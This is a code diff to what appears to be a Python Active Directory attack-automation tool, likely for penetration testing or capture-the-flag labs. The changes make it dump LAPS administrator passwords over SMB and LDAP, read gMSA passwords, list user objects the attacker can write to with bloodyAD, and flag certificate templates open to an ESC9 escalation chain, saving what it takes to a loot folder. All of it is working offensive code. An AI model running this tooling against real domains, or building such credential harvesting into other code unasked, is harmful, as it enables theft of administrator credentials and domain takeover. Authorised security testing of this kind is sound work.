@@ -209,20 +209,25 @@ def _check_laps(
 ) -> None:
     if "nxc" not in available:
         return
-    cmd = ["nxc", "smb", ip, "-u", user, "-p", pw, "-d", domain, "-M", "laps"]
     findings.h4("LAPS")
-    findings.cmd(" ".join(cmd))
-    out = runner.run(cmd, "creds_laps", timeout=30)
-    findings.code_block(_trim(out, lines=20))
-    for line in out.splitlines():
-        m = re.search(r"Computer:\s*(\S+)\s*,\s*LAPS Password:\s*(\S+)", line)
-        if m:
-            computer, laps_pw = m.group(1).rstrip("$"), m.group(2)
-            ws.add_cred(f"administrator:{laps_pw}")
-            ws.append_hash_file("laps.txt", [f"{computer}:administrator:{laps_pw}"])
-            findings.bullet(f"**LAPS password for `{computer}$`:** `{laps_pw}`")
-            findings.add_summary(f"LAPS: administrator@{computer} password in loot/laps.txt")
-            print(f"    [+] LAPS: {computer}$ → administrator password found")
+    # SMB first; Windows LAPS v2 stores passwords in LDAP — fall back to ldap if smb rejects it
+    for proto in ("smb", "ldap"):
+        cmd = ["nxc", proto, ip, "-u", user, "-p", pw, "-d", domain, "-M", "laps"]
+        out = runner.run(cmd, f"creds_laps_{proto}", timeout=30)
+        if "not supported for protocol" in out or ("invalid choice" in out and "laps" not in out.lower().split("invalid choice")[0]):
+            continue
+        findings.cmd(" ".join(cmd))
+        findings.code_block(_trim(out, lines=20))
+        for line in out.splitlines():
+            m = re.search(r"Computer:\s*(\S+)\s*,\s*LAPS Password:\s*(\S+)", line)
+            if m:
+                computer, laps_pw = m.group(1).rstrip("$"), m.group(2)
+                ws.add_cred(f"administrator:{laps_pw}")
+                ws.append_hash_file("laps.txt", [f"{computer}:administrator:{laps_pw}"])
+                findings.bullet(f"**LAPS password for `{computer}$`:** `{laps_pw}`")
+                findings.add_summary(f"LAPS: administrator@{computer} password in loot/laps.txt")
+                print(f"    [+] LAPS: {computer}$ → administrator password found")
+        break
 
 
 def _check_gmsa(
@@ -231,7 +236,7 @@ def _check_gmsa(
 ) -> None:
     if "nxc" not in available:
         return
-    cmd = ["nxc", "smb", ip, "-u", user, "-p", pw, "-d", domain, "-M", "gmsa"]
+    cmd = ["nxc", "ldap", ip, "-u", user, "-p", pw, "-d", domain, "-M", "gmsa"]
     findings.h4("gMSA Passwords")
     findings.cmd(" ".join(cmd))
     out = runner.run(cmd, "creds_gmsa", timeout=30)
@@ -262,6 +267,7 @@ def _bloodyad_writable(
         "-p", pw,
         "get", "writable",
         "--otype", "USER",
+        "--attr", "sAMAccountName",
     ]
     findings.h4("Writable AD Objects (bloodyAD)")
     findings.cmd(" ".join(cmd))
@@ -269,15 +275,30 @@ def _bloodyad_writable(
     findings.code_block(_trim(out, lines=40))
 
     targets: list[str] = []
+    # Parse per-object blocks: each starts with a distinguishedName line.
+    # sAMAccountName is preferred; CN from the DN is the fallback (reliable for service accounts).
+    current_sam: str | None = None
+    current_dn_cn: str | None = None
+
+    def _emit() -> None:
+        name = current_sam or current_dn_cn
+        if name and not name.endswith("$") and name.lower() != user.lower() and name not in targets:
+            targets.append(name)
+
     for line in out.splitlines():
-        m = re.search(r"sAMAccountName:\s*(\S+)", line, re.IGNORECASE)
-        if m:
-            sam = m.group(1).strip()
-            if sam and not sam.endswith("$") and sam.lower() != user.lower():
-                targets.append(sam)
+        stripped = line.strip()
+        if stripped.lower().startswith("distinguishedname:"):
+            _emit()
+            current_sam = None
+            m_cn = re.search(r"CN=([^,]+)", stripped)
+            current_dn_cn = m_cn.group(1) if m_cn else None
+        elif stripped.lower().startswith("samaccountname:"):
+            current_sam = stripped.split(":", 1)[-1].strip()
+    _emit()
+
     if targets:
         findings.bullet(f"**Writable user objects:** {', '.join(f'`{t}`' for t in targets)}")
-        findings.add_summary(f"bloodyAD: GenericWrite over {', '.join(targets)}")
+        findings.add_summary(f"bloodyAD: write access over {', '.join(targets)}")
         print(f"    [+] bloodyAD: writable over {', '.join(targets)}")
     else:
         print(f"    [-] bloodyAD: no writable user objects found")
@@ -419,6 +440,37 @@ def _esc9_chain(
     else:
         findings.note(f"ESC9 auth ran but no NT hash: {_trim(out_auth, lines=10)}")
         print(f"    [!] ESC9: auth ran but no NT hash extracted")
+
+
+def _parse_nosec_templates(out: str) -> list[tuple[str, str]]:
+    """Find templates with NoSecurityExtension + Client Authentication from -enabled output.
+    Returns (ca_name, template_name) for potential ESC9 targets regardless of enrollment rights."""
+    results: list[tuple[str, str]] = []
+    current_template: str | None = None
+    current_ca: str | None = None
+    client_auth = False
+    nosec = False
+
+    for line in out.splitlines():
+        stripped = line.strip()
+        if stripped.startswith("Template Name"):
+            if current_template and current_ca and client_auth and nosec:
+                results.append((current_ca, current_template))
+            current_template = stripped.split(":", 1)[-1].strip()
+            current_ca = None
+            client_auth = False
+            nosec = False
+        elif current_template and stripped.startswith("Certificate Authorities") and ":" in stripped:
+            current_ca = stripped.split(":", 1)[-1].strip()
+        elif current_template and stripped.startswith("Client Authentication") and ":" in stripped:
+            client_auth = "True" in stripped
+        elif current_template and "NoSecurityExtension" in stripped:
+            nosec = True
+
+    if current_template and current_ca and client_auth and nosec:
+        results.append((current_ca, current_template))
+
+    return results
 
 
 def _sync_time(ip: str, runner: Runner, findings: Findings, available: set[str]) -> None:
@@ -804,8 +856,21 @@ def _ad_core(
                         for wu, wh in shadow_hashes.items():
                             _esc9_chain(ip, domain, user, pw, ca, tmpl, wu, wh, runner, findings, ws, available)
             else:
-                findings.note("Full ADCS output saved to `loot/certipy_full.json` — review manually for ESC3/ESC9/ESC10")
-                print(f"    [-] No parseable vulnerabilities — check loot/certipy_full.json")
+                nosec_templates = _parse_nosec_templates(out_full)
+                if nosec_templates:
+                    for ca, tmpl in nosec_templates:
+                        findings.add_summary(
+                            f"ADCS ESC9 candidate: `{tmpl}` via {ca} (NoSecurityExtension — needs enrollment rights)"
+                        )
+                    findings.note(
+                        f"**{len(nosec_templates)} ESC9 candidate template(s)** with NoSecurityExtension + Client Auth: "
+                        + ", ".join(f"`{tmpl}`" for _, tmpl in nosec_templates)
+                        + " — gain enrollment rights (e.g. via group membership or ManageCA) to exploit via ESC9 chain"
+                    )
+                    print(f"    [+] {len(nosec_templates)} ESC9 candidate(s) detected — enrollment rights needed")
+                else:
+                    findings.note("Full ADCS output saved to `loot/certipy_full.json` — review manually")
+                print(f"    [-] No directly exploitable templates — see findings for candidates")
         elif "ESC" in out:
             for line in out.splitlines():
                 if "ESC" in line:
